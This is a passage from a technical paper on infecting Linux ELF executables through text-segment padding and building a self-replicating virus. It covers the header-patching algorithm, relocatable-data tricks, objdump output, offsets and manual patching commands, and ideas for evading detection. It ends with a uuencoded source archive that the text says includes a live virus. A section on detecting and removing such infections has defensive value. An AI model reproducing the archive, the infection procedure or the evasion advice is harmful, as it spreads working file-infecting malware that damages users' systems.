		* Increase p_filesz by account for the new code (parasite)
		* Increase p_memsz to account for the new code (parasite)
	* For each phdr who's segment is after the insertion (text segment)
		* increase p_offset by PAGE_SIZE
	* For the last shdr in the text segment
		* increase sh_len by the parasite length
	* For each shdr who's section resides after the insertion
		* Increase sh_offset by PAGE_SIZE
	* Physically insert the new code (parasite) and pad to PAGE_SIZE, into
	  the file - text segment p_offset + p_filesz (original)

infect-elf-p is the supplied program (complete with source) that implements
the elf infection using text segment padding as described.

INFECTING INFECTIONS

In the parasite described, infecting infections isn't a problem at all.  By
skipping executables that don't have enough padding for the parasite, this
is solved implicitly.  Multiple parasites may exist in the host, but their is
a limit of how many depending on the size of the parasite code.

NON (NOT AS) TRIVIAL PARASITE CODE

Parasite code that requires memory access requires the stack to be used
manually naturally.  No bss section can be used from within the virus code,
because it can only use part of the text segment.  It is strongly suggested
that rodata not be used, in-fact, it is strongly suggested that no location
specific data be used at all that resides outside the parasite at infection
time.

Thus, if initialized data is to be used, it is best to place it in the text
segment, ie at the end of the parasite code - see below on calculating address
locations of initialized data that is not known at compile/infection time.

If the heap is to be used, then it will be operating system dependent.  In
Linux, this is done via the 'brk' syscall.

The use of any shared library calls from within the parasite should be removed,
to avoid any linking problems and to maintain a portable parasite in files
that use varying libraries.  It is thus naturally recommended to avoid using
libc.

Most importantly, the parasite code must be relocatable.  It is possible to
patch the parasite code before inserting it, however the cleanest approach
is to write code that doesn't need to be patched.

In x86 Linux, some syscalls require the use of an absolute address pointing to
initialized data.  This can be made relocatable by using a common trick used
in buffer overflow code.

	jmp	A
B:
	pop %eax	; %eax now has the address of the string
	.		; continue as usual
	.
	.

A:
	call B
.string \""hello\""

By making a call directly proceeding the string of interest, the address of
the string is pushed onto the stack as the return address.

BEYOND ELF PARASITES AND ENTER VIRUS IN UNIX

In a UNIX environment the most probably method for a typical garden variety
virus to spread is through infecting files that it has legal permission to do
so.  

A simple method of locating new files possible to infect, is by scanning the
current directory for writable files.  This has the advantage of being
relatively fast (in comparison to large tree walks) but finds only a small
percentage of infect-able files.

Directory searches are however very slow irrespectively, even without large
tree walks.  If parasite code does not fork, its very quickly noticed what is
happening.  In the sample virus supplied, only a small random set of files
in the current directory are searched.

Forking, as mentioned, easily solves the problem of slowing the startup to
the host code, however new processes on the system can be spotted as abnormal
if careful observation is used.

The parasite code as mentioned, must be completely written in machine code,
this does not however mean that development must be done like this.
Development can easily be done in a high level language such as C and then
compiled to asm to be used as parasite code.

A bootstrap process can be used for initial infection of the virus into a host
program that can then be distributed.  That is, the ELF infector code is used,
with the virus as the parasite code to be inserted.

THE LINUX PARASITE VIRUS

This virus implements the ELF infection described by utilizing the padding at
the end of the text segment.  In this padding, the virus in its entirety is
copied, and the appropriate entry points patched.

At the end of the parasite code, are the instructions.

	movl	%ebp, $XXXX
	jmp	*%ebp

XXXX is patched when the virus replicates to the host entry point.  This
approach does have the side effect of trashing the ebp register which may or
may not be destructive to programs who's entry points depend on ebp being set
on entry.  In practice, I have not seen this happen (the implemented Linux
virus uses the ebp approach), but extensive replicating has not been performed.

On execution of an infected host, the virus will copy the parasite (virus)
code contained in itself (the file) into memory.

The virus will then scan randomly (random enough for this instance) through
the current directory, looking for ELF files of type ET_EXEC or ET_DYN to
infect.  It will infect up to Y_INFECT files, and scan up to N_INFECT files in
total.

If a file can be infected, ie, its of the correct ELF type, and the padding
can sustain the virus, a a modified copy of the file incorporating the virus
is made.  It then renames the copy to the file its infecting, and thus it
is infected.

Due to the rather large size of the virus in comparison to the page size
(approx 2.3k) not all files are able to be infected, in fact only near half on
average.

DEVELOPMENT OF THE LINUX VIRUS

The Linux virus was completely written in C, and strongly based around the
ELF infector code.  The C code is supplied as elf-p-virus.c  The code requires
the use of no libraries, and avoids libc by using a similar scheme to the
_syscall declarations Linux employs modified not to use errno.

Heap memory was used for dynamic allocation of the phdr and shdr tables using
'brk'.

Linux has some syscalls which require the address of initialized strings to
be passed to it, notably, open, rename, and unlink.  This requires initialized
data storage.  As stated before, rodata cannot be used, so this data was
placed at the end of the code.  Making it relocatable required the use of the
above mentioned algorithm of using call to push the address (return value)
onto the stack.  To assist in the asm conversion, extra variables were
declared so to leave room on the stack to store the addresses as in some
cases the address was used more than once.

The C code form of the virus allowed for a debugging version which produces
verbose output, and allows argv[0] to be given as argv[1].  This is
advantageous because you can setup a pseudo infected host which is non
replicating.  Then run the virus making argv[0] the name of the pseudo infected
host.  It would replicate the parasite from that host.  Thus it was possible to
test without having a binary version of a replicating virus.

The C code was converted to asm using the c compiler gcc, with the -S flag to
produce assembler.  Modifications were made so that use of rodata for
initialized data (strings for open, unlink, and rename), was replaced with
the relocatable data using the call address methodology.

Most of the registers were saved on virus startup and restored on exit
(transference of control to host).

The asm version of the virus, can be improved tremendously in regards to
efficiency, which will in turn improve the expected life time and replication
of the virus (a smaller virus can infect more objects, where previously the
padding would dictate the larger virus couldn't infect it).  The asm virus was
written with development time the primary concern and hence almost zero time
was spent on hand optimization of the code gcc generated from the C version.
In actual fact, less than 5 minutes were spent in asm editing - this is
indicative that extensive asm specific skills are not required for a non
optmised virus.

The edited asm code was compiled (elf-p-virus-egg.c), and then using objdump
with the -D flag, the addresses of the parasite start, the required offsets for
patching were recorded.  The asm was then edited again using the new
information.  The executeable produced was then patched manually for any bytes
needed. elf-text2egg was used to extract hex-codes for the complete length of
the parasite code usable in a C program, ala the ELF infector code.  The ELF
infector was then recompiled using the virus parasite.

# objdump -D elf-p-virus-egg
.
.
08048143 <time>:
 8048143:       55              pushl  %ebp
.
.
08048793 <main0>:
 8048793:       55              pushl  %ebp
.
.
 80487f8:       6a 00           pushl  $0x0
 80487fa:       68 7e 00 00 00  pushl  $0x7e
 80487ff:       56              pushl  %esi
 8048800:       e8 2e fa ff ff  call   8048233 <lseek>
.
.
 80489ef:       bd 00 00 00 00  movl   $0x0,%ebp
 80489f4:       ff e5           jmp    *%ebp

080489f6 <dot_jump>:
 80489f6:       e8 50 fe ff ff  call   804884b <dot_call>
 80489fb:       2e 00 e8        addb   %ch,%al

080489fd <tmp_jump>:
 80489fd:       e8 52 f9 ff ff  call   8048354 <tmp_call>
 8048a02:       2e 76 69        jbe    8048a6e <init+0x4e>
 8048a05:       33 32           xorl   (%edx),%esi
 8048a07:       34 2e           xorb   $0x2e,%al
 8048a09:       74 6d           je     8048a78 <init+0x58>
 8048a0b:       70 00           jo     8048a0d <tmp_jump+0x10>

0x8048143 specifies the start of the parasite (time).
0x8048793 is the entry point (main0).
0x80487fb is the lseek offset which is the offset in argv[0] to the parasite.
0x80489f0 is the host entry point.
0x8048a0d is the end of the parasite (not inclusive).

0x8048a0d - 0x8048143 (2250)is the parasite length.
0x8048793 - 0x8048143 (1616) is the entry point as a parasite offset.
0x80487fb - 0x8048143 (1720) is the seek offset as a parasite offset.
0x80489f0 - 0x8048143 (2221) is the host entry point as a parasite offset.

# objdump --all-headers elf-p-virus-egg
.
.
Program Header:
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x00015960 memsz 0x00015960 flags r-x
.
.

The seek offset as a file offset is 0x80487fb - 0x08048000 + 0x00000000 (2043)
(<seek address from above> - <vaddr> + <off>)

To patch the initial seek offset, an infection must be manually performed,
and the offset recorded.  The infected host is not functional in this form.

# infect-elf-p host
Parasite length: 2251, Host entry point index: 2221, Entry point offset: 1616
Host entry point: 0x8048074
Padding length: 3970
New entry point: 0x80486ce
Parasite file offset: 126
Infection Done
# vpatch elf-p-virus-egg 2043 126

The supplied program elf-egg2text will convert the address range specified
on the command line, and found using the ELF loadable segments in the file to
a hex string for use in C.

usage: elf-egg2text filename start stop

# elf-egg2text elf-p-virus-egg 0x08048143 0x8048a0d > parasite-v.c

parasite-v.c was edited manually to declare the hex string as the variabled
char parasite[], and likewise these variables were declared.

long hentry = 2221;
long entry = 1616;
int plength = 2250;

The infector was recompiled and thus can infect the host it was compiled for
making it a live virus.  null-carrier is the supplied host program that the
infector is compiled for.

This completed the manual infection of the virus to a host.  The newly infected
host would then attempt replication on execution.  A live virus has been
included in the source package (live-virus-be-warned).  A simplified carrier
program (carrier.S) was used to host the virus (null-carrier is the unfected
host as stated).

IMPROVING THE LINUX VIRUS

The first major change that would increase the life time and replication rates
of the virus is to optimise the code to be space efficient.  Looking at a 50%
size decrease is probably realistic when optimised.

The replication is notable rather slow scanning only the current directory.
The virus may be modified to do small tree walks increasing infection rates
dramatically.

The virus is easily detected - see below.

VIRUS DETECTION

The virus described is relatively easy to detect.  The blatant oddity is that
the entry point of the program isn't in a normal section or not in a section at
all.

Typically the last section in the text segment is .rodata which obviously
shouldn't be the entry point.  Likewise, it is suspicious if a program does
not have a corresponding section then this arouses any would be virus scanner.
Also if no section table at all, which will disguise what section the entry
point is in, is certainly an odd event (even though this is optional).

Removal of the virus described here, is similar to infection, requiring
deletion of the virus code, modification of the ELF headers to reflect segment
relocation in the file and patching of the entry point to jump to the proper
code.

Location of the correct entry point can be easily seen by disassembling the
executable using objdump, matching the entry point of the infected file to
the disassembled code, and tracing through the code to find where the parasite
code returns flow back to the host.

$ objdump --all-headers host		# a parasite infected host

>host:     file format elf32-i386
>host
>architecture: i386, flags 0x00000112:
>EXEC_P, HAS_SYMS, D_PAGED
>start address 0x08048522

.
.

The entry point is thus seen as 0x08048522, the entry point of the suspected
parasite code.

$ disassemble --disassemble-all host

>host:     file format elf32-i386
>
>Disassembly of section .interp:
>
>080480d4 <.interp>:
> 80480d4:       2f              das
> 80480d5:       6c              insb   (%dx),%es:(%edi)

.
.

>Disassembly of section .text:
>
>08048400 <_start>:
> 8048400:       31 ed           xorl   %ebp,%ebp
> 8048402:       85 d2           testl  %edx,%edx
> 8048404:       74 07           je     804840d <_start+0xd>

.
.

>Disassembly of section .rodata:
>
>0804851c <.rodata>:
> 804851c:       48              decl   %eax
> 804851d:       6f              outsl  %ds:(%esi),(%dx)
> 804851e:       73 74           jae    8048594 <_fini+0x94>
> 8048520:       0a 00           orb    (%eax),%al
> 8048522:       b8 00 84 04 08  movl   $0x8048400,%eax
> 8048527:       ff e0           jmp    *%eax
>        ...
>Disassembly of section .data:

.
.

Looking at the entry point code, which looks obviously to be parasite code
since its residing in the .rodata section, we have.

movl	$0x8048400,%eax
jmp	*%eax

This code is easily seen to be jumping to _start, the original host code.

# entry host 0x808400

The parasite code is thus easily removed from program flow by patching the
entry point to skip the parasite code.

On occasion no section matches the parasite code and hence the entry point. 
objdump will only disassemble sections so thus we cant see the parasite code as
is.  However, gdb can be used to disassemble manually, and the same method of
manually finding the host entry point can be used as above.

Automated virus detection of these variety of UNIX virus is practical by
detecting missing section headers and/or entry points to non permissible
sections or segments.

Typically, the default entry point is _start, however this can be changed in
linking.  If a virus has been found in a file, and the host entry point is
indeterminable for any reason, it may be beneficial to patch the entry point
to _start.  This however is still guesswork and not totally reliable.

Typical general virus detection algorithms are directly applicable in UNIX,
including signature strings, code flagging, file integrity checking etc.

EVADING VIRUS DETECTION IN ELF INFECTION

The major problem in terms of evading detection with the parasite described,
is that the entry point changes to a suspicious position.

Ideally, the entry point of the program either wouldn't change or stay within
expected sections.

A possible method using the parasite described would be to find unused memory
in normal entry point sections such as the .text section, and insert code to
jump to the parasite code.  This would require only a small number of bytes,
and such empty space is common, as can be noted by looking through disassembly
of executables.

Alternatively, one of the original ideas of where to insert the parasite code,
thrown away,  by extending the text segment backwards may be possible.  The
parasite code and entry point would belong in the .text section and thus
seemingly be quite normal.

CONCLUSION

The algorithms and implementation presented gives a clear example and proof of
concept that UNIX while not popular for, is actually a viable breeding ground
for parasites and virus.

--
begin 644 unix-linux-pv-src.tgz
M'XL(`#KH)C8``^P]_7/3R)+[J_57S(6%9P?;R/)''&?A%2\$'G4A;`6XO;V%
M<BF2[(C8DDN2G;!O]W^_[IX/S4BRG8#AU=[A*K`T']T]_3TM>;*,PIO6+(R6
M-ZW%JI4FWJ,?=OYA/?N@WV<_,/S8A6]QPP:#3J<_Z`ZZ7<8Z3L_N_,#ZNR>E
M_%FFF9LP]D,2Q]FF<=OZ_Z*?94G^K]RK8!+.@MWAZ-CVH-=;*W\'!*_DWQ\<
M@/Q[G5[W!V;OCH3UG__G\C\^9H_9U/.LX^>G3U^\@9O6:X>U)O$\S%J3Q)T'
MK44<1EF0L-:4W6.M7]S9S#H^/7EZ]OSEZ0E,J(71)/""R5C"";M!:,_F^MPF29
MMOS@8CEEJX6;>9=&1S""=LO=6K::W13$?CFU!E""6?Z""H+;C('AVM#VRE-CI:S
M6<MSDR0,$LL""JD9K*=%IJ(""M@.BMHYI^U_:LVH_UX^,&@_^)4PUF]K-6;+1P
M:(2-@Z++=7!$IP1""MY;%R1[5^'?57-F#$_FU9>E<&-46;N*F81;`&+VC""MC:
MH0A=;^%K$\P=Z6*L`MMZ]NSD'^]>&"")4*S5T1<XE)>.*""-:9A1[JWL;I0GLV
M`'AC`K""L>S5O45""K@H[BJ$*3L=B6H1B$C>.=*K2ET47""25.$`HYJXJ+]1@&-
MXC3S9^$%4UT(P=1]6HG>Q&;A*A`(+H+6M9M$@0_#VH\,""UDSRKN<QS[XY\IN
MRYL%;C2R:LD<O`1*6;F""AO7O=F;?/W?^E.._YHYVA&-K_+=[%/]MI]?M.WV,
M__WNX'O\_Q:?>V'DS99^P'X""30!7T[Y\8N5MT!#&9M/$B[*9V00:4YR6A-&T
M!`K<&+99JSCTV0QFU2&Q8!._R4YFDZXS/KGT$[8?P/\-ZU]6+9RP>A*X?AU'
M8&N3I>'O03RI\S$-]A^/BRTPK;8(DB1.ZGLX=Z]QA'G&39C5.WCYI\7A`H61
M-U_4<5KK23`.?5!YH./T^:NG+YKL#;\0`""<+6$XV@4D^@&ZRO;,XPZ'OHS+X
M/S'^9FSNAA&MSDVF7I-YEZ!C^W""]^NT#7QLM'&9H*T=:C@1].`V7Y[`'#YB\
MZ:XA9YFZTV""D93>8OD>0NK'?Z/Y#%:$:GL>`1X#V(0&,%T%4)UH['YKL]?C\
MV>NSTU\)`$Z!,3\QFX]7O,8Y'(>&A+#42-`HP@<DHR,8@LUB$7LG1#'EF*Q^
M/VV,F'US_P8H;C)%`TYL!V-:#%$/:TV#313_<KXS>BT!!S`&5]1AHX*<_.?X
MS<G;1@5L&K@&N+X2(!S4,(MGG'0'2#][=WK:9)U!CO4Z@80L)T>90,D""-`-0
ME-#D-91\$?\!`,&SX>[/[V'_+_RICO]&ROK%.#;'?P<""_X#O_YU>OT?[__[`
M=K['_V_QN46P&H_==#X>U_>L+)P'D/HOENGEC-T/+A96;1ZO\#)=-/F]ZKL1
M?<,Z=C2:6M./G2[<NC<\#/YHWPQMT=/JE4=C0Q,Q`/!X(?$F0699%\G5+LCI
M]7=#S@0W?3L@J..H-B_GF3W<#97+"",Q])WSKV#OB&^TXOYBBWZ_7L.ZPMS,Z
MX^OH*]%)K0/5ZN?4[T@[$TH)OY9Z=G>DG=,@PU0\_4IT5G*XT^OLAGC,*K\E
MX3O2#&\6ISOQZX/=T$,)]#=5@,-=F9C[Y6[L#G3O*(S2-N%;TKTC?^S%BT_C
MA9MDH3O;0GZZO$""\]N%`PA*#_3""_3D-SG3=QPH<T^3A!/`>""`[PY)^BF*9=I
MU3Y>!*Q]VAE8L)%T<4DP7*T*,$#?@2*6@)D$%)B+3%.T(DHL,*.>6377]U%W
M';$B(D92A]S]&!$EA]N0:6*KQ$;J<1=T?*3H0L89#6L9Y^+T`V308%36'D1!
M4A0""<352\;J:VY_)6J$^[HV@M[#V+$@S03_O_S@S.,T;/Y?1.7.*C!4*Z:J>
M^0)ZG![R['""DO!GOQ8Z1X@NDCSE?-%NZ49?$+7ZIE'V#\?$G""6/8+=[*]&!+
M=P?+(QB.Z0V$$MN""69#[ZW)J=;J.U""3.AE8'&GL""AL69E<T7XX_+^<+""""P0S
M$@MK=1Q;C128^H[D7M\QU%!7NRK')_N]2GL=&`;4=PPI.P>RH],Y..S9W4'O
MH*GPZZ,`\35K=96VNUQ-KV'A#K\#.->D#03>->?U]'E\9%>,1`Q=6[8.1*M$
MC'TC162SU:VF#;CF#`VN%0TZ#77YU87""IV%#I<,M$T""*K%0YCRYZJ2D2L](%
MW?\(N]%T&_P(#!UH<PEKS\!*&E!71M?LF>1TJ\@9&N0(AZ7\B.97=)W/M5JX
M2UU/2NX@9[.^6""^GQ$-*>E*I->L1PNG=6J6+;I0(I1QMK6/,/=3,I%5#J]N_
M$DII-;HME8A8'P>U(+&)7YH.IJ@,/24YX6J5A^<^Q88QN3%R`X$V-8O;SD`'
MROT[I]&Q^2V,&2H;,F%R""&80;9'5^#<-Z?%[-H)0'C^G6[!5&B?.""I5E]FP=
M90Y2=>8Y&'0([@EN<@O5QB,_B<06:4H^03>$OK(M-Q*K,<Q7I@1>'MM)<TPU
M+A*B/'7MXU27K.9OTE!1UZ_T.""CM@ID6%BXX.U""-VQQ)+D,:):DLLZ4G.<FI
MM@U]%Q@\Q6\4S4BJ0]<Q]`EN=9W%9VUY`*WPH#D/M;2E.T1E&FS21\UX^IMS
M?,7B@@?.I5D7IDF.ON253*9],Z]DFD^55QK4OY97*GH:Y55ZA@QZAU7$5/F6
M?F>TS98-""6-F@+F.D:6OTUGN@/I=Q.-(/`K+>G^J.T17$DWJN8:^?%]`G`*,
M><Y1=%[*&6GZ8Y*BC*G?'>4K%0RLL)O>=KOI=]`V<R>LX2ZYAH'!AI(5""?B>
M=""L?+Q#^0<5.2H.JW""`.58E^I[!ENK,)41%;8A[>QH*(8?K^HHA7YM,'FL6M
M-W2B`BMI9BQ1F?SMK3OW+L6K+W`9=]X<Y*17N)>M&^R*_4$YE2JZ)(G77BOJ
MN]!02K)S4HK^NU/8LW%PM(9BNEO:$5=1]9G^O""`2D5JH#'JSB-;Y=T647G:Z
M!6U%9O$J3%7@+!4,ODQU2K49G4,5A942W\HVK#FA;7O>S^52.22O88T>!:N#
M]@:A;M?YM!RIR]H^+&N[P=MM2K_#).:PLE1V2YTO,K!$TQ=)<[C-46V+!OS1
MU=<(2IHI\:>0GX-D8P`08]9OMZL(B:^CNRH`E?TN5%'P`#,T!_.""0GZ)7?G&
ML;M%%]?5(VB7D(=D(N6@=VNW14^<""H`1P.C6*L&?8N=E2LD4D04-=ESMQ%<D
M[-L5.IV!+95G6ZG3+;B'RK!C%!^<_M""L=<E6,]'^T7'ZU.$<%JJBG0-'=`R*
M,QS,K)VN;1=F##H#WJ$P5R56!4N_55:G;=3+>IZ&HI^4Z_""P`FW'MK\TI=-S
M4L6L""OJ%7CG.<+M+*>P$]?7Z-^O1K<V]^#3N5`\.JKPS-R=5]]:US)`2]PY^
MG/$J.%[P*OC:M-OI'^1%'+.`O9ZAA5(]OC:TH9!*'=U!KU/G'4.C9O+C@7,H
MMTFS#-@9^N'*B!_('J+TT*S`*(_%93?L:/SVRY/E,MNGPT[^@`YGY2+K'ZZO
M`Z@Q!^;VO/281[[B4&3TT""XP>H/FHBH,-Q""F%X'!(2G(A4>:`&10#A'""Q7<+
MGH6J;<..VH?W""_Y(]9<43R-4T6(4+SIVE4P&]M#T.!H3O\""5#'-7X@R&N6GW
M#[:GO\KD<B%N%=84A75HZX:_98^N>]N-8[:4RW;LTW(9KL_HB#GYLT%5G5J?
M3Q%W.J(*4]`X2F4.L=I]B#:9#^DI8SW4PW+1(Q82C*%6,L_=A5`]Z9]\[G""_
MJG\J9BU:!4H6""DWU&0YPJ?V1I14239_!PP-N+4LV?C@8K3=`D:*:E;C*.G>%
MFQ'C""-4FM[-]O6Z11>1-#OM2""8@!0V=T!S];'16+.2>FR-M2CI)B8>>H_#Q>
M&M1`3ZOS;-+/TT\OO]224O<S\M,\#^19*+)KG_?(.#\2M,MP;[7Y#W38^[WV
M^SW+DD_%Y3CY<%P?MPJ[3J\-/3B!?E(`>?$RB9C]_1<`?^7/QO?_=_0+P""WO
M_W=[`_7^O]USZ/U_NWOP_?W_;_')?Z!'2O`H^[0(4O.7>[RCZN>!O,</$\B$
MJGHP\:]J7_\;0NO1/A,_.F27;LJRRR`-6!0G<_!'GYKL8IFQZ\L@""5B6?$+7
MY*YB'[]GX87']A]9`'+B!Q-&/SFGG^*)'SIY<91FXK<-DWG69.UV&]S8O2#R
MPPE,@TDAA%#YPZZ:;38=OSNO=<RFD[-G-2>?^?/3%R?C-R__YZ1&%=Z\_?QL
M_.KULUH-$@6S\=UI#<8:;2_/CFLUS#7,^<]>UU\U:O6ZF+8/=^RAG-!@]R42
M_-V8G/?KR[/G)\=O`85J.I--'8V^MZ]^QI]OGSU]=5)#/]_KDI_?0UE8-<EZ
MR.E8^BE]A$^'0#9UU\N6U(X-%TL07H.$XT[=,&H*&;GX2T^0#D1&$$^;H3C9
MW(W8PH6L)KV,KU/F,N#_)$`58A-$EK&+[+K-K@.V!-'C#%(:JQ9'0=M""$4-4
M6GH98<;?N_G!:HQW8[@X8E4?4*IGP2KT`B`!`-2641I.H\!'$I*,H9:,QPO7
M[QQA:A)S:'""Q%MKS$'9@:9""$$.^CY?PB2`3D>>P'?#I>5<V7L[%?3*)2%I]%
ME^5I,.D4.I@7+\'2Q"")""G\^!B[6$O@,BV<MG+)X0)_&'H7]+67P=(<4(92JA
M3#=`>9'$RT49S!2;VPA%B2!9)P,E`L&O)@LGS+^-4!P02CR9</CX8\=U\-]`
M'U*(U#517R\^06)7A#Z+P5L@<(!V,;O2`0*,UPOP62#4BUGL7=%/*U$IV<M'
MKS?#@='ID4;+&2T2J>EWG!82PD&""OL_@V\T""OVT10/21?&TN7E8L#L""]A1X$
M-G/!A[F>%Z3KUS4>+R.P'%+F'/C\EL!!+<-)""`2&<;05A6.@\&Z)`NUVF:(K
MCJ8EX9=P=(\V]?8V]O8A-SWB?NP\F`=<[\""Q>""X,0N]""42-8!1%).;L$7Y5""
MXU5`]84FS_99D'F09I\%UP`8?""#ER'/72V*09H(.#0)8&D.4RE@6$]P@2:(8
MG&#H7=*0CY!ED',`W@*A""@H84`8^.&63))XS-YVK,$N.3KIHA;93Q_C<Q*<A
M3;SJ--UDVFFP]Q;>,6RG$1TFV_\%_X@OXW$2@(J^ES_G8ZMX!E(&3U3?4^_A
M[^').B.V]]C=8W6:T1`M-C6<G8_OW4,LC>;>!;34$72C3L@:#80NMP5$1B/'
M^F?%:IS*U=""E@Y?.NH7Q(4P.^89K;.YY1I/S&<ON;ELV77;QLGL+#O#13([^
M]S*C24<S[?E&>W<[DW0-)X?2I*HQ_Q_<RSY<07*C#3.LOHD/JIJLW*;/<?`W
MKDW^@@O&![SVFTS/)O8QPYR8B&@@?]P$#D'+(IN0QF27Q)P*+/0T4:(!KOM!
MVF0\/>#?^J2NF@2A6:.-8GR3Q^LFF_([""KL5*/E3TB*-\<Q',HO-47""-S15$
MR,HF8B_PB&?Z.!VN%G(`)245@(0+-=#*V(QP9^Y47!;9(9A.WE=QP\1`&4&3
M/^HI<EGTP5<:2$E#0AIY!9ZG&-_'Q#G7U[A.YY-P5>#G+8RK5ZGFTXL$&@""^
MYHU@:&NB/U579Z'@-VJ.4F9LF`41G1M""?`Q]-W-_4_N-#WH,Q,$1>XQE&?IY
M52*^;Z!-S<#3)2`XH2NX83\1<#HXPCAQA;`T\TETV(1V-XTAV-%!$T?&617Q
M'>?B46[LH4%=K793;,$C)Q)80Y$\H)VU6(0%*:*>G\=AT%9)6D(D)452\J(6
M-8U42^=('NV2%[?K0A[[\KP5+CR@3G:L>,MJAI9`7GEU2:=HR#OCYA(TUB(Q
M\U-AWM!Y.""D=""R.:?J:FA=ZDG1U#D@[%MU3_.$6XX*SB5/0$*]=7PQ=$6PK_
MEU*I""^`W^-""Z#6X=C""SEG%O@E]2N(%NY,[C1G2C^)VG`TUE:P#O8E4?YMKRF
M0I&)$,G""""<Y1#9)&N?T#>)""+0SXD]^K0AVI`G0$QY)%5.""[H=H>E&+('J"">G
MS\%3!9BF*Y#YH2UT1M!O]@>$P\\'LMD??Q3[.UI_IZ+?T?J=BOZNUM^U:D4%
M19+$>,H+<.S;\<E_GQSC24'EGF>_GE68@Q@'2>PEIB8X]-6X.QQH,,R^WG""P
M'LPJ2%+8+M#0_\)*R?G)V=LR=RG]_412DR<-8MJ<78+.A!F[BK`<@+U>G""1@
M8B!D<9X1/YV&1+)/?G*_\6#UFS""E#Z`Q^@$U')G<9C%(^V,\$@GS>_=B%@C1
MHMJS_/@HM*C&O@""SN(0]*BHU:CH,ND([8`_)5+#9G)KJ4U,Q]0K]%S<JSBJT
MHRM2P:NB2!<""S<61J=I(T]\T3<P/(%)TDF$7SB(J24D919U'I,9""&#+Y?:""(
M7Q3$!<X`QP4Z*3`@""28SE`W9WDT&'$?)B[H`GGW)TF`ZQRRAGL56#<5PS?@A
MG&&4!@D.;]#FIL8=%(]55@T%5$<\T%#7G9TD-Z21\/43,^3$PH</\_#%@<IS
MD.ATK\588""H&&7&,%$Z3(\ER'L.XM^/3UT^?H3T4@$`G'?@$D@+VHL*&:7GQ
M?V=G,6TG6>I^XOUB_ARV@NPB8#:5R\),+[&E5-\""PLDQNT)]^,(D&1AKTM])
M;*(%-#S]O113:]S+LWP<OW_(3$AT.!3ATC,$B*EU`>`!J^O-D/=K1-&\GRC`
M55!@'G852`)6PDYAB-*!HJA*5.KR%#P`>:ZX2>9=Q`R]APZ[>OA0A$QY[IDA
MS**CXH?%:C)#H>S3?D9Z'NA`O\/[""W:;;K/;]#/M5@3@5-IM6F6W3#/;M-)L
ME1U*LU7>F$@F0TP-0^2)B,1?-L2TPA!3$DAZ*27Z1')+V&:QWS1.6(=N6U0W
M$@;F(>E_)YGH%JS@""253]U3$>RS53Y@NS`BSE$HV^(QS`68Z(9Y%1GTHY+(O
MK$B&US?_?#O^^?SUBW^\?/NFK/TF`66-3)5&YD*C;$83%^S2!->$/O%D+H]X
M=&M&8SY""8[?1;K*9PK)[%52H`1V=AZD<SZ?PJD)1S<<M-*D>JR/Y8)W:TP4\
MF>^7<SQ+D/T!E\?G)T_?TM7;\W=GQTW*&]NB<@Z)3P6V>RCM*BQUGFXW4,*[
M0*/RS/.`]G*4W+JT7Y-&@[DB^B%V'6:7:_BWZ<C`#5N4NR>O!0""2'=L#?8%,
MV"",P$X](>[:3;^QE$182(FR[A8`WD[RZ[4YS/2ZNX""VI][?BT':76LDA@>LA
MC?],WD@])/=0Q2'4OU<%XPP]4CQL2?!EDS@*RD\]1?2@DJ%A?W*?NMFTQ$S3
MIC9.5>9""Y(+3G,7Q%:^C4Q1-PFD8`;6Y8Z'J6%UG`]6`UO""/U\6,X<M0NYF&
M?I5O`H*>TFLOE4P2SX6Q7/D^VL.OE[2S%X$1S\($@Y^#]F>!&*`LG*O8B-T/
M10^>EXFGD:I""`!\!_D7QI\8WRZ`]^&2&"")T%[BH`0K5:`Q^!&3%U0B/N'""YD
M?0.\WA/*6:@V!K>-H\*R>*52EWM#25?TZ9(UZ<-*A]S3W_(D6VJ@@A2^*HNU
M*&I9F?4I6=SR?7$3R6]>3L$U-]FG_$86&""*B!23)WP20V3.E:('/W`G^98*Y
M&RU=^=HAR@^#MJHQR`H,@'5LVZ;:@I(DM$_!?\,$:!7N*HOE.P:Z5R<?P+,I
M2!V""V02O*""*(6P-I7M$!M#U$NPT!@+Z,877ZEC=,*Z'*C+IS2[C;04J(78)8
MX4[4@<3BC&5Q>JQV]+#\6PNH&W;UB<-RUL\NU9&!%+2R]Y%^VJS4]/J&LX@A
MGFY+#PJS[=O,5FZ,\LZBJB'7S%B`8KU#&@\A;B7C3-6&B9LT%;KYL<98.!/+
M\=5R]MI[6Y<""MAQQ1R)>'L&G*'4\7)AOWD3MMXXF(<O]@*))YV+KA?Z&""(\\
M(<"";!N![PL21QX71^%``((JO2EA4*D:[EMM^24M';@N,2?SK2&Z)0S6+N""+=
M!7A$\;(+^^,/Y5&@5;SOTL`)X$<#]ZJDV[DJOX""]P/VTW6Z3-N(B6D_\L7B\
M(WVD?N""T/D2>.HT"".9+T3:2SII51D^(VM=0HM>:+S+E,MYQF_7AI#L""H/M/'
M)(.*S_01ZM;,2\ZRVLP+S32HH8##CD3P\X@W:(=L\^[([+;R_W7-%?N;H@;2
MK:@<"")'#=A&6QSLT%B6X60/CR%6$K[%*I1Y0X.$$);BWD<Q(`F^&/Q""`SP=!
M%/W[4]F97[`S&8,-P>D+^[_YOFOU^Y_YG[79!8XM?_^A.[`/Y-]_<.P^_OVO
M?J?[_?SG;_+9^+<>\K_9L/G/1%2\SUGU)R#D.Y[J=41Z#_'62>:^V,[N_V][
M3QL;QW'=4:1DZJ#VE,8_TC@(+D3](4<B]N.^UHH:2_(U$1#)%""E13D19O=O=
M$ZF2.IF\HRA5C""50U^9P9ET4%>`4-5J@<)&BS:]""L%N#ABRYE5&XBHLF@%JG
MK0HXQ;D64+4P6LJ6?9TW'SNSL[/W0=&*X]P2Q[O=G7GOS9OWWKR9>3-#&Y+@
M])=BCLP_P01U#9:V5#R.IPXW>WYH@3FF;/KLN#!XSYR?1.L#&+Q#I;PS&#!.
MC%+M%)'W3<\""6`^YI22F?%P`.=8""I?O*-H(SA-CL\/#CPX_$?4G5E+4X#4(^
M7""%XMD+PO(D.)^A$L.T>YS&XBJ=Y1%D,&YNC85VG*3R_]%#+620$AH'`X^4$
MS#9<<T"".'""O'""DO@#PC9V>61QQX(5'8P2Q2.VCN^HE/,7MVJAYW"",;*:;0?A
M:LT3B7,&P4D?\2V9M6"":HGPISU:`]P#Z%04/#GLVU/DD?DA@-F(""CT^+8A,F
MJ:@:O[8[NV=?^(DNPE""5/*5""""K#%/R&D/,M$<92)'Y-:':@V@&790FT0M1.R
MW',47-*;V@LOV@-+E!>QTLHXL%`8ZG(>$Z-=F.,_5AH;('FQ;%'YH4EA!A!$
